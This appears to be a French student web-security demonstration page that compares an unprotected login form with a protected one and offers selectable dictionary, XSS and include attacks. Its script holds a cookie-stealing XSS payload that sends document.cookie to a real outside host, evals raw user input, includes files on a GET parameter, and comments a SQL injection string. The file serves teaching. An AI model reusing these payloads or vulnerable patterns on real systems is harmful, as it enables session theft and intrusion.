<!DOCTYPE <!DOCTYPE html>
<html lang="fr">

    <head>
    
        <!-- allow to use accents -->
        <meta charset="utf-8">
        
        <!-- Basic SEO Optimization -->
        <meta name="description" content="">
        <meta name="keywords" content="">
        
        <!-- allow compatibility with IE -->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        
        <!-- allow compatibility with small devices like tablets and phones -->
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
        <!-- title of the website -->
        <title>Security tests</title>
        
        <!-- icon of the website -->
        <link rel="shortcut icon" href="">
        
        <!-- Fonts : need to be load before any others css files (Default Font "Roboto") -->
        <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:300,300i,400,400i,700,700i" rel="stylesheet">
        
        <!-- CSS -->
        <link rel="stylesheet" href="css/bootstrap.min.css">
        
    </head>

    <body>
		<?php
        if (isset( $_GET['includeattack'] ) )
        {
            $format = "./includeattack/includeattack1";
        	include( $format . '.php' );
        }
        ?>

        <div class="container">
            <div class="row">
                <div class="col-md-6">

                    <h2 style="text-align:center;">Sans Sécurité</h2>

                    <form id="formWithoutSecurity">
	                    <div class="form-group">
	                      <label for="labelLogin">Login</label>
	                      <input type="text" class="form-control" id="loginWithoutSecurity" placeholder="Login">
	                    </div>
	                    <div class="form-group" id="divWithoutSecurity">
	                      <label for="labelPassword">Password</label>
	                      <input type="password" class="form-control" id="passwordWithoutSecurity" placeholder="Password">
	                    </div>

	                    <div id="radio-group" style="border: 4px solid red; padding: 0 10px 0 10px; margin: 10px 0 10px 0;">
	                    	<h3 style="text-align:center;">Select your attack</h3>
	                    	<div class="radio">
							    <label><input type="radio" id="rb-dictionary" name="attack" value="dict-attack">Dictionary Attack</label>
							</div>
							<div class="radio">
							    <label><input type="radio" id="rb-xss" name="attack" value="xss-attack">Cross-site scripting</label>
							</div>
							<div class="radio">
							    <label><input type="radio" id="rb-include" name="attack" value="include-attack">Include Attack</label>
							</div>
							<div class="radio">
							    <label><input type="radio" id="rb-none" name="attack" value="no-attack">None</label>
							</div>
	                    </div>

	                    <div id="checkbox-group" style="border: 4px solid green; padding: 0 10px 0 10px; margin: 10px 0 10px 0;">
	                    	<h3 style="text-align:center;">Select your defence(s)</h3>

							<div class="checkbox">
						  		<label><input type="checkbox" id="cb-xss" value="">Prevent Cross-site scripting</label>
							</div>
							<div class="checkbox">
						  		<label><input type="checkbox" id="cb-sql" value="">Prevent Injections SQL</label>
							</div>
							<div class="checkbox">
						  		<label><input type="checkbox" id="cb-dic" value="">Prevent Dictionary and/or Brute Force attacks</label>
							</div>
	                    </div>
	                    
						
                          <button type="submit" id="submitWithoutSecurity" class="btn btn-block btn-danger">Submit Without Security</button>
                    </form>

                    <!--<button type="button" id="submitDictionaryAttack" class="btn btn-block btn-warning">Dictionary Attack</button>-->

                </div>
                
                <div class="col-md-6">
                    
                    <h2 style="text-align:center;">Avec Sécurité</h2>

                    <form id="formWithSecurity">
                          <div class="form-group">
                            <label for="labelLogin">Login</label>
                            <input type="text" class="form-control" id="loginWithSecurity" placeholder="Login">
                          </div>
                          <div class="form-group has-error" id="divWithSecurity">
                            <label for="labelPassword" >Password - 8 chars & 1 digit & 1 uppercase & 1 lowercase min</label>
                            <input type="password" class="form-control" id="passwordWithSecurity" placeholder="Password">
                          </div>
                          <button type="submit" id="submitWithSecurity" class="btn btn-block btn-success disabled">Submit With Security</button>
                    </form>

                </div>

            </div>

            <hr style="border: 0; 
					  height: 5px; 
					  background-image: -webkit-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -moz-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -ms-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -o-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);">

            <div class="row">

                <div class="col-md-6">
                    
                    <div id="displayWithoutSecurity"></div>

                </div>

                <div class="col-md-6">
                    
                    <div id="displayWithSecurity"></div>

                </div>

            </div>

            <hr style="border: 0; 
					  height: 5px; 
					  background-image: -webkit-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -moz-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -ms-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -o-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);">

            <div class="row">

                <div class="col-md-12">

                    <br/><br/><br/>
                    <button type="button" id="clear" class="btn btn-block btn-info">Clear everything</button>

                </div>

            </div>
            
        </div>

        <!-- JQuery JS -->
        <script src="js/jquery.js"></script>

        <!-- JQuery cookie JS -->
        <script src="js/jquery.cookie.js"></script>

        <script>
        $(document).ready(function(){

        	/* XSS Attack - Put malicious JS in login input */
            $('input[type=radio][name=attack]').change(function() {
		        if (this.value == 'xss-attack') {
                	$("#loginWithoutSecurity").val("window.open(\"http://asso.fanabriques.fr/xssattack/xss.php?c=\"+document.cookie);");
		        }
		    });
			
			/* Handle the event when the form with security is submitted */
			/* Example SQL injection ==> mickael' or 1=1 -- ' */
            $("#submitWithoutSecurity").click(function(){

            	if($("#rb-dictionary").is(":checked")){
            		var login = $("#loginWithoutSecurity").val();
					var dataString = 'login='+ login;
					if(login == '')
					{
						$("#displayWithoutSecurity").html("<h3 style=\"text-align:center;\">Need a login at least</h3>");
					}
					else
					{
						$("#displayWithoutSecurity").html("Searching in progress...");
						$.ajax({
							type: "POST",
							url: "dictionaryattack/dictionary.php",
							data: dataString,
							cache: false,
							success: function(result){
								$("#displayWithoutSecurity").html(result);
							}
						});
					}
					return false;
            	} 
				else {
            		var login = $("#loginWithoutSecurity").val();
					var pass = $("#passwordWithoutSecurity").val();
					var prevent_sql = "no";

					if($("#cb-sql").is(':checked')){
						prevent_sql = "yes";
					}

					if($("#rb-xss").is(":checked") && !$("#cb-xss").is(':checked')){
						try {
							eval(login);
						} catch (err) {
							console.log("message : " + err + " and is not a javascript function");
						}

						try {
							eval(pass);
						} catch (err) {
							console.log("message : " + err + " and is not a javascript function");
						}
					}
					
					var dataString = 'login='+ login + '&pass='+ pass + '&sql='+ prevent_sql;
					if(login == '' || pass == '')
					{
						$("#displayWithoutSecurity").html("<h4 class=\"bg-warning\" style=\"text-align:center; padding: 30px 0 30px 0;\">Please fill all fields</h4>");
					}
					else
					{
						if($("#rb-include").is(":checked")){
							window.location = "http://uha.artgalerielataniere.fr/?includeattack=1";
						}
						else{
							$.ajax({
								type: "POST",
								url: "processorWithoutSecurity.php",
								data: dataString,
								cache: false,
								success: function(result){
									$("#displayWithoutSecurity").html(result);
								}
							});
						}
					}
					return false;
            	}				
            });
			
			$("#submitWithSecurity").click(function(){
				if(!$('#submitWithSecurity').hasClass('disabled')){
					var login = $("#loginWithSecurity").val();
					var pass = $("#passwordWithSecurity").val();
					var dataString = 'login='+ login + '&pass='+ pass;
					if(login == '' || pass == '')
					{
						$("#displayWithSecurity").html("<h4 class=\"bg-warning\" style=\"text-align:center; padding: 30px 0 30px 0;\">Please fill all fields</h4>");
					}
					else
					{
						$.ajax({
							type: "POST",
							url: "processorWithSecurity.php",
							data: dataString,
							cache: false,
							success: function(result){
								$("#displayWithSecurity").html(result);
							}
						});
					}
					return false;
				} else {
					return false;
				}
            });
			
			/* Handle the event when writting the password */
			$('#passwordWithSecurity').keyup(function(){
				var inputVal = $(this).val();
				//var div = $('#divWithSecurity')[0];
				//var regex = /^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/;
				var regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&])[A-Za-z\d$@$!%*?&]{8,}$/;
				if(!regex.test(inputVal)) {
					console.log("Not good enough ...");
					if(!$('#divWithSecurity').hasClass('form-group has-error')){
						$('#divWithSecurity').removeClass();
						$('#divWithSecurity').addClass("form-group has-error");
					}
					if(!$('#submitWithSecurity').hasClass('disabled')){
						$('#submitWithSecurity').addClass("disabled");
					}
				}else{
					console.log("Good !!!");
					//div.removeClass().addClass("form-group has-success");
					$('#divWithSecurity').removeClass();
					$('#divWithSecurity').addClass("form-group has-success");
					$('#submitWithSecurity').removeClass("disabled");
				}
			});

			/* Handle the dictionary attack */
			/*$('#submitDictionaryAttack').click(function(){
				var login = $("#loginWithoutSecurity").val();
				var dataString = 'login='+ login;
				if(login == '')
				{
					$("#displayWithoutSecurity").html("<h3 style=\"text-align:center;\">Need a login at least</h3>");
				}
				else
				{
					$.ajax({
						type: "POST",
						url: "dictionaryattack/dictionary.php",
						data: dataString,
						cache: false,
						success: function(result){
							$("#displayWithoutSecurity").html(result);
						}
					});
				}
				return false;
			});*/

			/* clear everything */
			$('#clear').click(function(){

				if (!!$.cookie('username')) {
					$.removeCookie('username', { path: '/' });
				}

				if (!!$.cookie('password')) {
					$.removeCookie('password', { path: '/' });
				}

				$("#displayWithSecurity").html("");
				$("#displayWithoutSecurity").html("");
				$("#formWithSecurity")[0].reset();
				$("#formWithoutSecurity")[0].reset();
			});

        });
        </script>

    </body>

</html>